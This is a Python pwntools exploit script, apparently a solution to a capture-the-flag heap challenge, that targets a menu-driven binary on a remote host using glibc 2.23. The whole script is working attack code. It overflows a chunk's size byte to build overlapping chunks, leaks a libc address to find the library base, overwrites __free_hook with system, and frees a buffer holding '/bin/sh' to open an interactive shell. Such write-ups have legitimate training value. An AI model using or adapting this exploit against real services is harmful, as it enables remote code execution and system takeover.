from pwn import *
context.terminal = ['gnome-terminal','-x','sh','-c']

io=remote('172.20.2.11',25688)
#io=process('./pwn')
libc=ELF('./libc-2.23.so')

#libc=ELF('./libc-2.23.so')
def add(idx,size):
    io.recvuntil('Choice')
    io.sendline('1')
    io.recvuntil('index>> ')
    io.sendline(str(idx))
    io.recvuntil('size>> ')
    io.sendline(str(size))

def show(idx):
    io.recvuntil('Choice')
    io.sendline('5')
    io.recvuntil('index>> ')
    io.sendline(str(idx))

def edit(idx,data):
    io.recvuntil('Choice')
    io.sendline('3')
    io.recvuntil('index>> ')
    io.sendline(str(idx))
    io.recvuntil('name>>')
    io.send(data)

def free(idx):
    io.recvuntil('Choice')
    io.sendline('2')
    io.recvuntil('index>> ')
    io.sendline(str(idx))

add(0,0x28)
add(1,0x68)   
add(2,0x28)
add(3,0x28)
edit(3,'/bin/sh\x00\n')
edit(0,'a'*0x28+p8(0xe1))
free(1)
add(1,0x88)
show(2)
libc_base=u64(io.recvuntil('\x7f')[-6:].ljust(8,'\x00'))-0x3c4b78
free_hook=libc_base+libc.sym["__free_hook"]
sys=libc_base+libc.sym["system"]
edit(1,'a'*0x68+p64(0x21)+p64(0x30)+p64(free_hook)+'\n')
edit(2,p64(sys)+'\n')
free(3)




#gdb.attach(io)

io.interactive()



